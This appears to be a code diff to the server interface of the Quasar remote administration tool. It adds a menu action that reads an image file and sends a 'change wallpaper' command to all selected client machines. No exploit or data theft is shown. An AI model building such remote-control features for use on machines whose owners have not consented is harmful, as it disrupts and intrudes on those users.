@@ -28,6 +28,9 @@ using System.Xml;
 using Quasar.Common.Messages.Monitoring.VirtualMonitor;
 using Newtonsoft.Json;
 
+using Quasar.Common.Messages.UserSupport;
+
+
 namespace Quasar.Server.Forms
 {
     public partial class FrmMain : Form
@@ -1366,6 +1369,35 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void cWToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.InitialDirectory = "c:\\";
+                openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp";
+                openFileDialog.FilterIndex = 1;
+                openFileDialog.RestoreDirectory = true;
+
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    string selectedFilePath = openFileDialog.FileName;
+                    byte[] imageData = File.ReadAllBytes(selectedFilePath);
+                    string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLower();
+
+                    foreach (Client c in GetSelectedClients())
+                    {
+                        c.Send(new DoChangeWallpaper
+                        {
+                            ImageData = imageData,
+                            ImageFormat = imageFormat
+                        });
+                    }
+                }
+            }
+        }
+
+
+
         private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (Client c in GetSelectedClients())
@@ -1840,4 +1872,5 @@ namespace Quasar.Server.Forms
             }
         }
     }
+
 }
